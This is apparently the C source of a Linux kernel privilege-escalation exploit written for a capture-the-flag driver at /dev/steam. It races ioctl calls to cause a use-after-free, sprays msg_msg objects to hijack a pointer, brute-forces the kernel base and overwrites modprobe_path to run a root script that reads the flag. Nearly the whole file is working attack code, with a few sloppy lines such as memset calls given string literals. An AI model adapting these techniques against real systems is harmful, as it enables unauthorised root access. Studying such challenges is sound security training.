// this shit approach requires bruteforce kernel_base => work but work like shit
// need to refer Triacontakai's solution
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define DEVICE_PATH "/dev/steam"
#define PAGE_FAULT_ADDR 0xcafe000

#define MAX_ENGINES 0x100
#define MAX_COMPARTMENTS 0x200

#define NAME_SZ 0x28
#define DESC_SZ 0x70
#define LOG_SZ 0x100

#define ADD_ENGINE 0xc00010ff
#define ADD_COMPARTMENT 0x1337beef
#define DELETE_COMPARTMENT 0xdeadbeef
#define SHOW_ENGINE_LOG 0xcafebeef
#define UPDATE_ENGINE_LOG 0xbaadbeef

int steam_fd;
ulong kernel_base = 0xffffffff81000000, kernel_heap;
ulong user_cs, user_sp, user_ss, user_rflags;
ulong modprobe_path=0xa231e0L;
uint stage = 0, counter = 0;
char engine_name[NAME_SZ], compartment_desc[DESC_SZ];
int engine_id;
uchar leak[0x100];
int32_t compartments[MAX_COMPARTMENTS];
int start;
typedef struct 
{
    int id;
    uchar usage;
    char engine_name[NAME_SZ];
    char *logs;
} engine_t;

typedef struct
{
    int id;
    char compartment_desc[DESC_SZ];
    engine_t *engine;
} compartment_t;

typedef struct
{
    int id;
    char *name;
    char *desc;
    char *logs;
} request;

typedef struct 
{
    long mtype;
    char mtext[0x10000];
} msg;
msg msgbuf;

int add_engine(char*);
int add_compartment(char*, int);
int del_compartment(int);
int show_log(int, char*);
int upd_log(int, char*);
int msg_alloc(int, char*, uint);
void *race(void);

int main()
{
    prepare_modprobe_path();
    steam_fd = open_dev(DEVICE_PATH);

    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    char msg_payload[0x1000] = {0};
    memset(msg_payload, 0, 0x1000);

    usleep(50000);

    // prepare an engine 
    memset(engine_name, "A", NAME_SZ);
    memset(compartment_desc, "B", DESC_SZ);
    // engines .bss: 0xffffffffc0003380
    // compartments .bss: 0xffffffffc0002380
    engine_id = add_engine(engine_name);
    printf("[+] engine_id: 0x%lx\n", engine_id);
    
    // create 0xff-1 compartments => engine->usage == 0xfe
    usleep(5000);
    int compartment_id;
    for (int i=0;i<0xfe;i++, counter++) {
        compartments[counter] = add_compartment(compartment_desc, engine_id);
        // printf("[%d] compartment_id: 0x%lx - engine_id: 0x%lx\n", counter, compartments[counter], engine_id);
        if (compartments[counter] == -1) 
            panic("Error when create compartments!!");
    }

    // extend race window by allocate some compartments => make find_empty_slot() slower
    /* ------------------------------------------- */
    puts("[+] Extending race window");
    int32_t tmp_engine_id;
    memset(engine_name, "X", NAME_SZ);
    tmp_engine_id = add_engine(engine_name);
    for (int i=0;i<0xff;i++, counter++) {
        printf("%d\n", i);
        compartments[counter] = add_compartment(compartment_desc, tmp_engine_id);
        // printf("[%d] compartment_id: 0x%lx - engine_id: 0x%lx\n", counter, compartments[counter], engine_id);
        if (compartments[counter] == -1) 
            panic("Error when create compartments!!");
    }
    /* -------------------------------------------- */
    
    puts("[+] Starting race!");
    // create 2 threads to race until success
    int32_t pthread1_result, pthread2_result;
    for (int i=0;i<100000;i++) {
        pthread_t tid1, tid2;

        pthread_create(&tid1, NULL, race, NULL);
        pthread_create(&tid2, NULL, race, NULL);

        // goooooooo
        usleep(5000);
        start = 1;
        pthread_join(tid1, &pthread1_result);
        pthread_join(tid2, &pthread2_result);
        printf("pthread1_result: 0x%lx\n", pthread1_result);
        printf("pthread2_result: 0x%lx\n", pthread2_result);

        if (pthread1_result != -1 && pthread2_result != -1 )
            break;
        else if (pthread1_result == -1 && pthread2_result == -1)
            goto clean_garbage;

        if (pthread1_result != -1)
            del_compartment(pthread1_result);
        if (pthread2_result != -1)
            del_compartment(pthread2_result);
        start = 0;
    }

    // debug("After race");
    memset(engine_name, "C", NAME_SZ);
    puts("[+] brutefocring...");
    usleep(5000);
    ulong *tmp = &msg_payload;

    // bruteforce kernel base
    int ret = -1;
    while (ret == -1) {
        printf("[*] Kernel_base attemp: 0x%lx\n", kernel_base);
        tmp[0] = kernel_base;
        tmp[1] = kernel_base;

        // use msg_msg object to overwrite the address of logs in engine struct
        msg_alloc(qid, msg_payload, 0x38);
        ret = show_engine_log(pthread1_result, leak);
        kernel_base += 0x1000;
        // debug("kernel_base attemp");
        msg_free(qid, msg_payload, 0x40); 
    }

    kernel_base -= 0x1000;
    printf("[+] kernel_base: 0x%lx\n", kernel_base);
    modprobe_path += kernel_base;
    printf("[+] modprobe_path: 0x%lx\n", modprobe_path);

    tmp[0] = modprobe_path;
    msg_alloc(qid, msg_payload, 0x40);
    update_engine_log(compartments[0], "/tmp/copy.sh\x00\x00\x00\x00");
    // overwrite modprobe_path 
    trigger_modprobe_path();
    system("cat /tmp/flag");

clean_garbage:
    // reach here when finish exploit (or fail)
    puts("[!] Cleaning garbage!!!!!");
    for (int i=0;i<counter;i++) 
        del_compartment(compartments[i]);
    return -1;
}

void *race(void) 
{
    puts("[*] Waiting for counter reach usage engine");
    while (!start);
    int32_t compartment_id = add_compartment(compartment_desc, engine_id);
    printf("[%d] compartment_id: 0x%lx - engine_id: 0x%lx (race)\n", counter, compartment_id, engine_id);

    return compartment_id;
}
int add_engine(char *name) 
{
    printf("[*] Calling add_engine(%p)\n", name);
    request req = {
        .id = 0,
        .name = name,
        .desc = NULL,
        .logs = NULL
    };
    int ret = ioctl(steam_fd, ADD_ENGINE, &req);
    assert(ret != -1);
    return ret;
}

int add_compartment(char *desc, int engine_id)
{
    //printf("[*] Calling add_compartment(%p, 0x%lx)\n", desc, engine_id);
    request req = {
        .id = engine_id,
        .name = NULL,
        .desc = desc,
        .logs = NULL,
    };
    int ret = ioctl(steam_fd, ADD_COMPARTMENT, &req);
    //assert(ret != -1);
    return ret;
}

int del_compartment(int compartment_id)
{
    // printf("[*] Calling del_compartment(0x%lx)\n", compartment_id);
    request req = {
        .id = compartment_id,
        .name = NULL,
        .desc = NULL,
        .logs = NULL
    };
    int ret = ioctl(steam_fd, DELETE_COMPARTMENT, &req);
    // assert(ret != -1);
    return ret;
}

int show_engine_log(int compartment_id, char *log)
{
    //printf("[*] Calling show_engine_log(0x%lx, %p)\n", compartment_id, log);
    request req = {
        .id = compartment_id,
        .name = NULL,
        .desc = NULL,
        .logs = log
    };
    int ret = ioctl(steam_fd, SHOW_ENGINE_LOG, &req);
    return ret;
}

int update_engine_log(int compartment_id, char *log)
{
    printf("[*] Calling update_engine_log(0x%lx, %p)\n", compartment_id, log);
    request req = {
        .id = compartment_id,
        .name = NULL,
        .desc = NULL,
        .logs = log
    };
    int ret = ioctl(steam_fd, UPDATE_ENGINE_LOG, &req);
    assert(ret != -1);
    return ret;
}

int msg_alloc(int qid, char *data, uint size)
{
    msgbuf.mtype = 1;
    //dump_output(msgbuf.mtext, 0x10);
    memcpy(msgbuf.mtext, data, size - 0x30);
    //dump_output(msgbuf.mtext, 0x10);
    return msgsnd(qid, &msgbuf, size - 0x30, 0);
}

int msg_free(int qid, char *data, uint size) 
{
    msgbuf.mtype = 1;

    return msgrcv(qid, &msgbuf, size-0x30, 1, 0);
}
